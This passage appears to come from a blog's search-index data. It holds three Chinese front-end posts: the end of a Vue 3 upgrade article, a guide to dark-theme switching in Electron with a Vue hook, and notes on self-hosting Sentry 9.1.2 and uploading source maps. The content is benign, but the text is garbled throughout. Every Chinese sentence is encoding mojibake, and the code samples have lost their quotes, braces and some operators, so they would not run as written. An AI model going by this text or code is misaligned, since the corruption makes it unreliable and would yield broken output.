·ä¿æŒå¥½é¡¹ç›®å…¼å®¹æ€§å‰æä¸‹ï¼Œè¿˜å¯ä½“éªŒåˆ° Composition API ä¾¿åˆ©ã€‚ å‡çº§ Vue è¿‡ç¨‹ä¸­ï¼Œå¯åˆ©ç”¨å®˜æ–¹å’Œç¤¾åŒºå·¥å…·ï¼Œå¸®åŠ©é«˜æ•ˆå‡çº§ã€‚å¯ä½¿ç”¨ compat ç»™å‡ºæé†’ï¼Œé¡¹ç›®ä¸­è®¾ç½®@vue/compat ä½œä¸º vue çš„åˆ«åï¼Œè¿™æ ·å†…éƒ¨å°±ä¼šæŠŠæ‰€æœ‰å’Œ Vue 2 çš„è¯­æ³•ç›¸å…³çš„å‡çº§ä¿¡æ¯æç¤ºå‡ºæ¥ï¼Œé€ä¸ªæ›¿æ¢å³å¯æˆ–ç›´æ¥ä½¿ç”¨ GoGoCode è¿›è¡Œè‡ªåŠ¨åŒ–æ‰¹é‡æ›¿æ¢ã€‚ å…¨é¢æ‹¥æŠ± Vue 3 ä¹Ÿæ˜¯ç¦»å¼€èˆ’é€‚åœˆçš„æŒ‘æˆ˜ï¼Œå¸¦æ¥ä¸åªæ–°æ¡†æ¶ä½“éªŒï¼Œä¹Ÿå¯èƒ½æ›´å¥½æ½œåŠ›ä¸å¾…é‡ã€‚"},{"title":"Electron - æä¸€æŠŠæ·±è‰²ä¸»é¢˜","path":"/2023/10/29/1dbb59fcd9ec/","content":"ä»€ä¹ˆæ˜¯æ·±è‰²ä¸»é¢˜æ·±è‰²ä¸»é¢˜åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿè¿™ä¸ªè®²æ³•å…¶å®å¾ˆå®½æ³›ï¼Œæˆ‘ä»¬ä»¥å¾€è§è¿‡ä¸å°‘æ·±è‰²è°ƒä¸ºä¸»çš„ç•Œé¢é…è‰²æ–¹æ¡ˆã€‚æ¯”å¦‚ç¨‹åºå‘˜éå¸¸ç†Ÿæ‚‰çš„ä»£ç ç¼–è¾‘å™¨ï¼Œå„ç§æ·±è‰²çš®è‚¤æ—©å°±å¤§è¡Œå…¶é“ã€‚è€Œæˆ‘ä»¬ä»Šå¤©è¦è®¨è®ºçš„ï¼Œä¸»è¦æ˜¯è‹¹æœè¿‘å¹´æ¥çš„äº§å“ä¸­æ¨å‡ºçš„æ·±è‰²ä¸»é¢˜åŠŸèƒ½ï¼Œä»¥åŠå…¶åœ¨ Electron ä¸­çš„åº”ç”¨å®ç°ã€‚ è‹¹æœåœ¨ 2017 å¹´å‘å¸ƒçš„ macOS High Sierra (10.13) é¦–å…ˆå®éªŒæ€§åœ°æ”¯æŒäº†æ·±è‰²é¡¶æ å’Œ dockï¼Œç»§è€Œåœ¨ Mojave (10.14) æä¾›äº†å®Œæ•´çš„æ·±è‰²ä¸»é¢˜æ”¯æŒã€‚æ¥ä¸‹æ¥çš„ Catalina (10.15) åˆ™å¢åŠ äº† Auto é€‰é¡¹ï¼Œå¯ä»¥éšä¸€å¤©ä¸­çš„æ—¶é—´å˜åŒ–è‡ªåŠ¨åˆ‡æ¢ç³»ç»Ÿä¸»é¢˜ã€‚åç»­çš„å¤§ç‰ˆæœ¬æ›´æ–°ä¹Ÿä¸æ–­ä¼˜åŒ–è¿™ä¸ªåŠŸèƒ½ã€‚åœ¨ç§»åŠ¨ç«¯ï¼ŒiOS 13 å¼€å§‹åŠ å…¥æ·±è‰²ä¸»é¢˜åŠŸèƒ½ã€‚macOS å¯ç”¨æ·±è‰²ä¸»é¢˜åï¼Œå†…ç½®çš„åº”ç”¨ä¼šåˆ‡æ¢ä¸ºæ·±ç°è‰²ä¸ºä¸»çš„é…è‰²ï¼Œå­—ä½“åˆ™æ˜¾ç¤ºä¸ºæµ…ç°è‰²ã€‚ ç¬¬ä¸‰æ–¹åº”ç”¨å¦‚æœé€‚é…äº†æ·±è‰²ä¸»é¢˜ï¼Œä¹Ÿä¼šæ ¹æ®è®¾ç½®æ”¹å˜è‡ªèº«çš„ç•Œé¢é…è‰²ã€‚ ç›®å‰ä¸»æµçš„ App åŠç½‘ç«™éƒ½é€‚é…äº†æ·±è‰²ä¸»é¢˜ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸‹ç”¨ Electron å¼€å‘ä¸€ä¸ªå®¢æˆ·ç«¯è½¯ä»¶ï¼Œå¦‚ä½•å®ç°æ·±è‰²ä¸»é¢˜å§ã€‚ è‡ªå®šä¹‰ç•Œé¢Electron å…è®¸å¼€å‘è€…ä½¿ç”¨ Web æŠ€æœ¯æ„å»ºæ¡Œé¢åº”ç”¨ç¨‹åºï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ç½‘é¡µæŠ€æœ¯æ¥åˆ¤æ–­å½“å‰é¡µé¢æ˜¯å¦è¯¥æ˜¾ç¤ºæ·±è‰²ä¸»é¢˜ã€‚ ç”¨ CSS åˆ¤æ–­ ä½ å¯ä»¥é€šè¿‡ prefers-color-scheme CSS åª’ä½“æŸ¥è¯¢æ¥å®ç°æ­¤åŠŸèƒ½ @media (prefers-color-scheme: dark) body background: #333; color: white; @media (prefers-color-scheme: light) body background: #ddd; color: black; ç”¨ js åˆ¤æ–­ ç”¨ Media Query æ¥åˆ¤æ–­ç”¨æˆ·å½“å‰çš„ç³»ç»Ÿä¸»é¢˜ï¼Œç„¶ååœ¨æ ¹èŠ‚ç‚¹ä¸­æ·»åŠ ä¸åŒçš„ class æ¥åŒºåˆ†ä¸»é¢˜ const isDark = window.matchMedia((prefers-color-scheme: dark));document.body.classList.remove(dark, light);document.body.classList.remove(isDark ? dark : light);## style.css.dark background: #333; color: white;.light background: #ddd; color: black; è™½ç„¶ç”¨ CSS å’Œ JS éƒ½å¯ä»¥å®ç°æ¸²æŸ“ä¸åŒçš„ç³»ç»Ÿä¸»é¢˜ï¼Œä½†æ˜¯å¦‚æœè¦å®ç°ç”¨æˆ·è‡ªä¸»é€‰æ‹©ä¸»é¢˜ï¼Œè¿™æ˜¯å°±éœ€è¦ localStorage æ¥è®°ä½ç”¨æˆ·é€‰æ‹©ï¼Œå› æ­¤ç”¨ JS æ¥å®ç°æ›´å¥½ã€‚ åœ¨ Vue æ¡†æ¶ä¸­è¦æ›´å¥½çš„ä½¿ç”¨ä¸»é¢˜åˆ‡æ¢çš„è¯ï¼Œå¯ä»¥å°†è¿™éƒ¨åˆ† js é€»è¾‘æŠ½ç¦»æˆä¸€ä¸ª hookï¼Œä¸‹é¢ç»™å‡ºä¸ªç¤ºä¾‹ä»£ç ï¼š import ref, computed from vue;export type BasicColorMode = light | dark;export type BasicColorSchema = BasicColorMode | system;interface UseThemeOptions /** * ç›®æ ‡å…ƒç´ é€‰æ‹©å™¨ * @default html */ selector?: string; /** * ç›®æ ‡å…ƒç´ ä¿®æ”¹å±æ€§ * * @default class */ attribute?: string; /** * åˆå§‹ä¸»é¢˜ * @default system */ initialValue?: BasicColorSchema; /** * ä¿å­˜åˆ° localStorage/sessionStorage ä¸­çš„å€¼å¯¹åº”çš„ key * @default color-scheme */ storageKey?: string; /** * å­˜å‚¨å¯¹è±¡ï¼Œé»˜è®¤ä¸º localStorage * @default localStorage */ storage?: Storage; /** * å½“ isDark=true æ—¶åº”ç”¨äºç›®æ ‡å…ƒç´ çš„å€¼ * * @default dark */ valueDark?: string; /** * å½“ isDark=false æ—¶åº”ç”¨äºç›®æ ‡å…ƒç´ çš„å€¼ * * @default light */ valueLight?: string; /** * åˆ‡æ¢ä¸»é¢˜æ—¶è§¦å‘çš„å›è°ƒå‡½æ•° */ onChanged?: (dark: boolean, mode: BasicColorSchema) = void;export const useTheme = (options: UseThemeOptions = ) = const selector = html, attribute = class, initialValue = system, storageKey = color-scheme, storage = localStorage, valueDark = dark, valueLight = light, onChanged, = options; const mode = refBasicColorSchema(initialValue); const checkSystemDark = () = window.matchMedia((prefers-color-scheme: dark)).matches; const checkDark = (colorSchema: BasicColorSchema) = if (colorSchema === system) return checkSystemDark(); return colorSchema === dark; ; const setThemeClass = (colorSchema: BasicColorSchema) = const _isDark = checkDark(colorSchema); const isClass = attribute === class; const domTarget = document.querySelector(selector); const valueMode = _isDark ? valueDark : valueLight; if (isClass) domTarget?.classList.remove(valueDark, valueLight); domTarget?.classList.add(valueMode); else domTarget?.setAttribute(attribute, valueMode); ; const setMode = (_mode: BasicColorSchema) = mode.value = _mode; storage.setItem(storageKey, _mode); setThemeClass(_mode); onChanged?.(checkDark(_mode), _mode); ; const localMode = storage.getItem(storageKey); localMode setMode(localMode as BasicColorSchema); const isDark = computed(() = checkDark(mode.value)); return isDark, mode, setMode ;; é»˜è®¤æƒ…å†µä¸‹ï¼Œä½¿ç”¨ Tailwind CSS åå¥½çš„æ·±è‰²æ¨¡å¼ï¼Œå½“å°† class dark åº”ç”¨äº html æ ‡ç­¾æ—¶å¯ç”¨æ·±è‰²æ¨¡å¼ï¼Œä¾‹å¦‚ï¼š !--light--html .../html!--dark--html class=dark .../html ä¸è¿‡ï¼Œè¿˜å¯ä»¥å¯¹å…¶è¿›è¡Œè‡ªå®šä¹‰ï¼Œä½¿å…¶ä¸å¤§å¤šæ•° CSS æ¡†æ¶å…¼å®¹ã€‚ä¾‹å¦‚ï¼š const isDark = useTheme( selector: body, attribute: color-scheme, valueDark: dark, valueLight: light,); æœ€ç»ˆä¼šå‘ˆç° !--light--html body color-scheme=light ... /body/html!--dark--html body color-scheme=dark ... /body/html å¦‚æœä¸Šé¢çš„é…ç½®ä»»ç„¶ä¸æ»¡è¶³ä½ çš„éœ€æ±‚ï¼Œå¯ä»¥ä½¿ç”¨ onChange å®Œå…¨æ§åˆ¶ä½ çš„ä¸»é¢˜åˆ‡æ¢ const isDark = useTheme( onChanged(dark: boolean) // update the dom, call the API or something ,); å¦‚ä½•åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ script setup lang=tsimport useTheme from ./hooks/useTheme;const mode, isDark, setMode = useTheme();const resetMode = () = setMode(system);const checkMode = () = setMode(isDark.value ? light : dark);/scripttemplate div p Current theme source: strong mode /strong /p button type=button @click=checkModeToggle Dark Mode/button button type=button @click=resetModeReset to System Theme/button /div/template åˆ‡æ¢æ•ˆæœå¦‚ä¸‹ï¼š åŸç”Ÿç•Œé¢åœ¨åˆ‡æ¢ä¸»é¢˜æ—¶ï¼Œä¼šå‘ç°æœ‰éƒ¨åˆ†é¡µé¢å¹¶ä¸ä¼šè·Ÿç€åˆ‡æ¢ï¼Œè¿™æ˜¯å› ä¸ºæ•´ä¸ªé¡µé¢ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼ŒåŸç”Ÿç•Œé¢å’Œè‡ªå®šä¹‰ç•Œé¢ï¼ŒåŸç”Ÿç•Œé¢åˆåˆ†ä¸ºæ ‡é¢˜æ å’Œå·¥å…·æ ï¼Œè¿™éƒ¨åˆ†ä¸èƒ½ç”¨ web æŠ€æœ¯æ¥æ“æ§ï¼Œéœ€è¦ç”¨ç³»ç»Ÿçš„ APIã€‚ é¦–å…ˆåœ¨ preload.js ä¸­ï¼Œæš´éœ²ä¸¤ä¸ª IPC é€šé“åˆ°æ¸²æŸ“å™¨è¿›ç¨‹ä¸­ const contextBridge, ipcRenderer = require(electron)contextBridge.exposeInMainWorld(darkMode, toggle: () =ipcRenderer.invoke(dark-mode:toggle), system: () =ipcRenderer.invoke(dark-mode:system) ) ç„¶ååœ¨ä¸»è¿›ç¨‹ä¸­æ·»åŠ äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œç”¨ nativeTheme API ä¿®æ”¹ç³»ç»Ÿæ ·å¼ const app, BrowserWindow, ipcMain, nativeTheme = require(electron) constpath = require(node:path) const createWindow = () = const win = newBrowserWindow( width: 800, height: 600, webPreferences: preload:path.join(__dirname, preload.js) ) win.loadFile(index.html)ipcMain.handle(dark-mode:toggle, () = if (nativeTheme.shouldUseDarkColors) nativeTheme.themeSource = light else nativeTheme.themeSource = dark return nativeTheme.shouldUseDarkColors ) ipcMain.handle(dark-mode:system, ()= nativeTheme.themeSource = system ) app.whenReady().then(() = createWindow() app.on(activate, () = if(BrowserWindow.getAllWindows().length === 0) createWindow() ) )app.on(window-all-closed, () = if (process.platform !== darwin) app.quit() ) æœ€ååœ¨æ¸²æŸ“è¿›ç¨‹ä¸­é€šè¿‡ window.darkMode å‘é€æ¶ˆæ¯åˆ°ä¸»è¿›ç¨‹ä¸­ const mode, isDark, setMode = useTheme( onChanged: (dark, _mode) = if(_mode === system) window.darkMode.system() else window.darkMode.toggle() ); ç°åœ¨è¿˜æœ‰ä¸ªé—®é¢˜ï¼Œæ¯æ¬¡å¯åŠ¨æ—¶é»˜è®¤çš„éƒ½æ˜¯ç³»ç»Ÿä¸»é¢˜ï¼Œå› æ­¤éœ€è¦å°†ç”¨æˆ·é€‰æ‹©çš„ä¸»é¢˜ä¿å­˜åˆ°æœ¬åœ°ï¼Œæˆ‘ä»¬ä½¿ç”¨ electron-store æ¥ä¿å­˜ç”¨æˆ·é…ç½®ï¼ˆä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä»»ä½•ä½ å–œæ¬¢çš„å­˜å‚¨æ–¹å¼ï¼‰ import nativeTheme from electron;import Store from electron-store;type ThemeColor = typeof nativeTheme.themeSource;const store = new Store theme: ThemeColor ( defaults: theme: system, ,);export const getThemeStore = () = store.get(theme);export const setThemeStore = (theme: ThemeColor) = store.set(theme, theme); ç„¶ååœ¨ä¸»è¿›ç¨‹ä¸­ï¼Œæ ¹æ®ç”¨æˆ·é…ç½®ï¼Œé‡ç½®é»˜è®¤ä¸»é¢˜ const themeColor = getThemeStore();nativeTheme.themeSource = themeColor; æ•´åˆä¸€ä¸‹ç°åœ¨æ¸²æŸ“è¿›ç¨‹å’Œä¸»è¿›ç¨‹éƒ½åˆ†åˆ«å®ç°äº†ä¸»é¢˜çš„åˆ‡æ¢å¹¶ä¸”éƒ½èƒ½æ ¹æ®ç”¨æˆ·çš„é…ç½®é€‰æ‹©é»˜è®¤ä¸»é¢˜ã€‚ä½†æ˜¯è¿™é‡Œæœ‰äº›é—®é¢˜ï¼š ä¸»é¢˜é…ç½®åœ¨ä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹éƒ½ä¿å­˜äº†ä¸€éæœ‰äº›å†—ä½™ ä¸»é¢˜çš„åˆ‡æ¢è¿‡ç¨‹ä¸­æ•°æ®æµå‘æœ‰äº›æ··ä¹±ï¼Œæœ€å¥½èƒ½ä¿æŒå•å‘æ•°æ®æµã€‚ å› æ­¤æœ€ç»ˆçš„ç‰ˆæœ¬ä¸­æˆ‘ä»¬åˆ æ‰æ¸²æŸ“è¿›ç¨‹çš„é…ç½®ä¿å­˜ï¼Œå°†ç”¨æˆ·é€‰æ‹©çš„ä¸»é¢˜ä¿å­˜åˆ°ä¸»è¿›ç¨‹ä¸­ï¼Œæœ€åæ¢³ç†å‡ºçš„æµç¨‹å›¾å¦‚ä¸‹ï¼š æ•´åˆä¹‹åçš„æ•ˆæœå¦‚ä¸‹ï¼Œç¤ºä¾‹ä»£ç ï¼šhttps://github.com/bijinfeng/electron-vue-theme-switch æ€»ç»“Electron ä½¿ç”¨äº† web æŠ€æœ¯æ ˆæ¸²æŸ“è‡ªå®šä¹‰ç•Œé¢ï¼Œå› æ­¤åœ¨è‡ªå®šä¹‰ç•Œé¢å®ç°æš—é»‘ä¸»é¢˜å’Œåœ¨ç½‘é¡µç«¯æ²¡æœ‰åŒºåˆ«ï¼ŒæŠ€æœ¯éƒ½æ˜¯é€šç”¨çš„ã€‚ä½†æ˜¯ Electron ä¸­è¿˜æœ‰åŸç”Ÿç•Œé¢å­˜åœ¨ï¼Œè™½ç„¶æœ‰æä¾› API å»ä¿®æ”¹ä¸»é¢˜ï¼Œä½†æ˜¯è¦å’Œè‡ªå®šä¹‰ç•Œé¢åšåˆ°åŒæ­¥ä¿®æ”¹ï¼Œæ•´åˆä¸¤è¾¹çš„æŠ€æœ¯æ–¹æ¡ˆä¹Ÿæ˜¯ä¸€ä¸ªæ¯”è¾ƒéº»çƒ¦çš„äº‹ï¼Œè¿™é‡Œæä¾›ä¸€ç§æŠ€æœ¯å®ç°æ€è·¯ã€‚"},{"title":"ç§æœ‰åŒ–éƒ¨ç½² Sentry åŠæ¥å…¥è¸©å‘è®°å½•","path":"/2023/10/06/c32a83b54674/","content":"ç®€ä»‹Sentry æ˜¯ä»€ä¹ˆï¼Ÿä¸­æ–‡ç¿»è¯‘è¿‡æ¥æ˜¯ã€Œå“¨å…µã€çš„æ„æ€ï¼Œæ²¡é”™ï¼Œå®ƒæ˜¯ç¨‹åºçš„å“¨å…µï¼Œå®ƒå¯ä»¥ç›‘æ§æˆ‘ä»¬åœ¨ç”Ÿäº§ç¯å¢ƒä¸­é¡¹ç›®çš„è¿è¡ŒçŠ¶æ€ï¼Œä¸€æ—¦æŸæ®µä»£ç è¿è¡ŒæŠ¥é”™ã€æˆ–è€…å‘ç”Ÿå¼‚å¸¸ï¼Œä¼šç¬¬ä¸€æ—¶é—´å°†æŠ¥é”™çš„ä¿¡æ¯ï¼šé¡µé¢è·¯ç”±ã€å¼‚å¸¸æ–‡ä»¶ã€è¯·æ±‚æ–¹å¼ç­‰ä¸€äº›éå¸¸è¯¦ç»†çš„ä¿¡æ¯ä»¥æ¶ˆæ¯æˆ–è€…é‚®ä»¶çš„æ–¹å¼é€šçŸ¥æˆ‘ä»¬ï¼Œå‘Šè¯‰æˆ‘ä»¬ï¼šç¨‹åºå‡ºé”™äº†ã€‚è€Œæˆ‘ä»¬å¯ä»¥ä»è¯¦ç»†çš„æŠ¥é”™ä¿¡æ¯ä¸­å¿«é€Ÿåˆ†æé—®é¢˜æ‰€åœ¨ï¼Œä»è€Œå¿«é€Ÿåœ°ä¿®å¤ Bugã€‚ ä¸ºä»€ä¹ˆæ˜¯ Sentryï¼Ÿæ˜¯çš„ï¼Œåœ¨å¸‚åœºä¸Šæœ‰è®¸å¤šä¾›åº”å•†æä¾›ç±»ä¼¼çš„ä¸€ä½“åŒ–è§£å†³æ–¹æ¡ˆï¼Œå›½å¤–æœ‰ BugSnagã€ RollBarï¼Œå›½å†…æœ‰ oneapmã€fundebugï¼Œé‚£ä¸ºä»€ä¹ˆæˆ‘ä»¬ååé€‰æ‹© Sentry å‘¢ï¼Ÿ å› ä¸º Sentry æ˜¯ 100% å¼€æºçš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒçš„ SaaS ç‰ˆçš„ï¼Œé™¤æ­¤ä¹‹å¤–æˆ‘ä»¬ä¹Ÿå¯ä»¥ç§æœ‰åŒ–éƒ¨ç½²ã€‚ å¦å¤– Sentry æ”¯æŒä¸»æµçš„ç¼–ç¨‹è¯­è¨€ï¼Œå¯ä»¥é€šè¿‡ è¿™é‡Œ æŸ¥çœ‹æ‰€æœ‰æ”¯æŒçš„è¯­è¨€ã€‚ é€šè¿‡ä¸‹é¢è¿™å¼ å›¾å¯ä»¥çœ‹å‡ºï¼ŒSentry åœ¨å‰ç«¯çš„è¿‘ä¸¤å¹´å‘å±•è¶‹åŠ¿ï¼Œä»¥åŠä¸å…¶å®ƒç«äº‰è€…å¯¹æ¯”ï¼š å¯ä»¥çœ‹åˆ° Sentry çš„ npm ä¸‹è½½é‡åŸºæœ¬æ˜¯ç¨³æ­¥ä¸Šå‡ï¼ŒåŒæ—¶å¼•å…¥ Sentry åŒ…ä½“ç§¯è¿˜å¾ˆå°ï¼Œæ‰“åŒ…ååªæœ‰ 20kï¼š å¦‚ä½•ç§æœ‰åŒ–éƒ¨ç½²ï¼ŸSentry å®˜æ–¹æä¾›äº†åŸºäºäº‘çš„ SaaS æœåŠ¡ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜è¦ç§æœ‰åŒ–éƒ¨ç½²å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºå¦‚æœå¯¹äºæ•°æ®éšç§å’Œå®‰å…¨æœ‰ç€æ›´é«˜çš„è¦æ±‚ï¼Œæˆ–è€…éœ€è¦æ›´å¤šçš„è‡ªå®šä¹‰å’Œæ§åˆ¶æƒï¼Œé‚£ä¹ˆç§æœ‰åŒ–éƒ¨ç½² Sentry æ˜¯ä¸ªæ›´å¥½çš„é€‰æ‹©ã€‚ Sentry å¯ä»¥ä½¿ç”¨ Dockerã€Docker-composeã€K8s çš„æ–¹å¼éƒ¨ç½²åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šã€‚ å…³äºç§æœ‰åŒ–éƒ¨ç½²çš„æ–¹æ³•è¿™é‡Œç»™å‡ºå‚è€ƒæ–‡æ¡£ï¼Œå¦‚æœ‰éœ€è¦å¯ä»¥çœ‹çœ‹ï¼š Self-Hosted Sentry Sentry 10 helm charts éœ€è¦æ³¨æ„çš„æ˜¯æœ€æ–°ç‰ˆæœ¬çš„ sentry çš„åŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œä½†æ˜¯åŒæ—¶å¸¦æ¥çš„æ˜¯å¯¹æœåŠ¡å™¨çš„æ€§èƒ½è¦æ±‚å¾ˆé«˜ï¼Œå› æ­¤å¦‚æœåªéœ€è¦ sentry æœ€åŸºæœ¬çš„åŠŸèƒ½ï¼Œæ¨èéƒ¨ç½² sentry 9.1.2 çš„ç‰ˆæœ¬ï¼Œ ä¸‹é¢æ˜¯ä¸¤ä¸ªç‰ˆæœ¬éœ€è¦çš„èµ„æºå’ŒåŠŸèƒ½å¯¹æ¯”ï¼š 23.9.1 Docker 19.03.6+ Compose 2.0.1+ 4 CPU Cores 8 GB RAM 20 GB Free Disk Space 9.1.2 Docker 17.05.0+ Compose 1.17.0+ 3 GB RAM æ€»ç»“ä¸€ä¸‹ï¼Œå¦‚æœä½ éœ€è¦æ›´å®Œå¤‡çš„é”™è¯¯è¿½è¸ªå’Œåˆ†æåŠŸèƒ½å¹¶ä¸”æ°å¥½è´¢åŠ›é›„åšï¼Œå»ºè®®ä½¿ç”¨å®˜æ–¹çš„ SaaS æœåŠ¡æˆ–è€…ç§æœ‰åŒ–éƒ¨ç½²æœ€æ–°ç‰ˆæœ¬ï¼Œå¦åˆ™è¿˜æ˜¯å»ºè®®éƒ¨ç½² 9.1.2 ç‰ˆæœ¬ï¼Œè¯¥æœ‰çš„åŠŸèƒ½éƒ½æœ‰ï¼Œå¤Ÿä½ ä½¿ç”¨äº†ã€‚ å¦‚ä½•æ¥å…¥å‰ç«¯ SDK?æ—¢ç„¶ç§æœ‰åŒ–éƒ¨ç½²äº† sentry çš„ 9.1.2 ç‰ˆæœ¬ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åœ¨å‰ç«¯æ¥å…¥ä¸ŠæŠ¥ SDKï¼Œç„¶è€Œå®˜æ–¹æ–‡æ¡£ä¸Šé»˜è®¤é’ˆå¯¹çš„éƒ½æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œåƒ 9.1.2 è¿™æ ·çš„ä¸Šå¤ç‰ˆæœ¬æ¥å…¥æ–‡æ¡£æ—©å°±æ·¹æ²¡åœ¨æµ©ç€šçš„å†å²å˜æ›´è®°å½•ä¸­ï¼Œäº’è”ç½‘ä¸Šæ›´å¤šçš„ä¹Ÿæ˜¯æ–°ç‰ˆæœ¬çš„èµ„æ–™ã€‚ç»è¿‡ä¸æ–­çš„è¸©å‘ï¼Œç»ˆäºæ˜¯å®Œæˆäº† 9.1.2 ç‰ˆæœ¬çš„ sdk æ¥å…¥ï¼Œç”±äºç²¾åŠ›æœ‰é™ï¼Œåªå®Œæˆäº† Electron å’Œ Vue å¹³å°çš„æ¥å…¥ï¼Œå…¶ä»–å¹³å°çš„å°±ä¸åœ¨æ­¤è®°å½•äº†ã€‚ Electron å®‰è£… sdk pnpm add @sentry/electron åœ¨ä¸»è¿›ç¨‹å…¥å£æ–‡ä»¶åˆå§‹åŒ– sentryï¼ˆå°½å¯èƒ½çš„æå‰åˆå§‹åŒ–ï¼‰ import * as Sentry from @sentry/electron;import packageJson from ../../../package.json;Sentry.init( dsn: SENTRY_DSN, sampleRate: 1, release: packageJson.version,); Vue é™¤äº†éœ€è¦ç‰¹å®šç‰ˆæœ¬çš„ sdkï¼Œå…¶ä»–çš„å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ å®‰è£… sdk ## æœ€æ–°ç‰ˆæœ¬çš„ sdk ä¸å…¼å®¹ 9.1.2 ç‰ˆæœ¬çš„ sentryï¼Œä½¿ç”¨æ—§ç‰ˆæœ¬pnpm add @sentry/vue@5.30.0 -D åˆå§‹åŒ– sdk import * as Sentry from @sentry/vue;import Vue from vue;Sentry.init( Vue, dsn: SENTRY_DSN, release: packageJson.version,); ä¸Šä¼  Source Mapæ¥å…¥ sdk åï¼Œæˆ‘ä»¬æ‰‹åŠ¨è§¦å‘ä¸ªé”™è¯¯ï¼Œå°±å¯ä»¥çœ‹åˆ°åœ¨ sentry ä¸Šå¤šå‡ºæ¥ä¸€ä¸ªæ–°çš„ Issueï¼Œç‚¹å¼€å¯ä»¥çœ‹åˆ°æ›´è¯¦ç»†çš„æŠ¥é”™ä¿¡æ¯ï¼š ä½†æ˜¯è¿™ä¸ªæŠ¥é”™ä¿¡æ¯å¯¹æˆ‘ä»¬çš„æ„ä¹‰å´ä¸æ˜¯å¾ˆå¤§ï¼Œå› ä¸ºæ ¹æ®è¿™ä»½æŠ¥é”™ä¿¡æ¯æˆ‘ä»¬æ²¡æ³•é”å®šå‡ºé—®é¢˜çš„æºç ä½ç½®ã€‚å¯èƒ½ä¼šæœ‰å°æœºçµé¬¼è¯´ï¼Œæˆ‘æ˜æ˜çœ‹åˆ°äº†é”™è¯¯å †æ ˆï¼Œé‡Œé¢æœ‰é”™è¯¯çš„æ–‡ä»¶åï¼Œè¡Œæ•°å’Œåˆ—æ•°ï¼Œä¸ºä»€ä¹ˆè¿˜æ˜¯æ²¡åŠæ³•é”å®šï¼Ÿ è¿™æ˜¯å› æ­¤ç°ä»£å‰ç«¯éƒ¨ç½²çš„ä»£ç éƒ½æ˜¯åˆå¹¶å’Œå‹ç¼©è¿‡çš„ï¼Œå°±ä¸æ˜¯ç»™äººç±»è¯»çš„ï¼Œç›¸ä¿¡æˆ‘æ²¡æœ‰è¶…èƒ½åŠ›åˆ«æŒ‡æœ›èƒ½åæ¨å‡ºæºç ã€‚ è¿™æ—¶å°±éœ€è¦å€ŸåŠ© source map äº†ï¼Œä»€ä¹ˆï¼Ÿä¸çŸ¥é“ä»€ä¹ˆæ˜¯ source mapï¼Ÿå»ºè®®å…ˆçœ‹å¤–è¿™ç¯‡æ–‡ç« ã€Šæ·±å…¥æµ…å‡ºä¹‹ Source Mapã€‹å†å¾€ä¸‹çœ‹ã€‚è€Œä¸”å¹¸å¥½çš„æ˜¯ sentry é›†æˆäº† source map çš„è§£æèƒ½åŠ›ï¼ˆåœ¨ 9.1.2 è¿™ä¸ªç‰ˆæœ¬ä¹Ÿæ˜¯æœ‰çš„ï¼Œåªæ˜¯è—çš„æœ‰ç‚¹æ·±ï¼‰ ä¸Šé¢çœ‹å®Œäº†ç›¸ä¿¡ä½ ä¹Ÿæ˜ç™½äº† source map çš„é‡è¦æ€§ï¼Œæ¥ä¸‹æˆ‘ä»¬å¼€å§‹ä¸Šä¼  source map åˆ° sentryï¼š å®‰è£… webpack sdk sentry é’ˆå¯¹ä¸åŒçš„ç¼–è¯‘å™¨æœ‰ä¸åŒçš„ä¸Šä¼  sdkï¼Œå…¶ä»–å¹³å°è§å®˜æ–¹æ–‡æ¡£ï¼Œæˆ–è€…ä½¿ç”¨ cli ä¸Šä¼ ï¼Œä½†æ˜¯ä¸ºäº†çœäº‹å’Œç®€åŒ–æµç¨‹ï¼Œæˆ‘ä»¬é‡‡ç”¨ sdk çš„ä¸Šä¼ æ–¹å¼ pnpm add @sentry/webpack-plugin@2.7.1 -D é…ç½® webpack æ’ä»¶ const sentryWebpackPlugin = require(@sentry/webpack-plugin);const packageJson = require(./package.json);module.exports = productionSourceMap: true, // ç”Ÿäº§ç¯å¢ƒç”Ÿæˆ source map configureWebpack: plugins: [ sentryWebpackPlugin( org: xxxx, project: xxxx, url: xxxx, authToken: xxxx, release: name: packageJson.version, uploadLegacySourcemaps: paths: [./dist_electron/bundled], , , ), ], ,; æ›´å¤šé…ç½®å‚æ•°è§å®˜æ–¹æ–‡æ¡£ï¼š@sentrywebpack-pluginï¼Œè¿™é‡Œç€é‡ä»‹ç»ä¸‹éœ€è¦æ³¨æ„çš„ç‚¹ï¼š webpack éœ€è¦ç”Ÿæˆ source mapï¼Œæ²¡æœ‰çš„è¯ï¼Œsdk å°±æ˜¯æ— ç±³è€Œç‚Š release.name éœ€è¦å’Œä¸ŠæŠ¥ sdk é‡Œçš„ release å­—æ®µä¿æŒä¸€è‡´ï¼Œä»¥ä¾¿äºå°†å¼‚å¸¸æŒ‰ç…§ release è¿›è¡Œåˆ†ç±» uploadLegacySourcemaps é…ç½®éœ€è¦ä¸Šä¼ çš„æ–‡ä»¶ç›®å½• ä»¥ä¸Šé…ç½®å®Œæˆåï¼Œè¿è¡Œæ‰“åŒ…å‘½ä»¤ï¼Œå°±å¯ä»¥åœ¨ sentry ä¸­çœ‹åˆ°ä¸Šä¼ çš„ source map äº† æœ‰äº† source mapï¼Œsentry å°±èƒ½æ ¹æ® source map è§£æå‡ºæºç ä½ç½® è‡ªå®šç”¨æˆ·ä¿¡æ¯åœ¨ sentry çš„é»˜è®¤ä¸ŠæŠ¥ä¸­ï¼Œåªä¼šä¸ŠæŠ¥ç”¨æˆ· ip åœ°å€ä½œä¸ºç”¨æˆ·çš„èº«ä»½æ 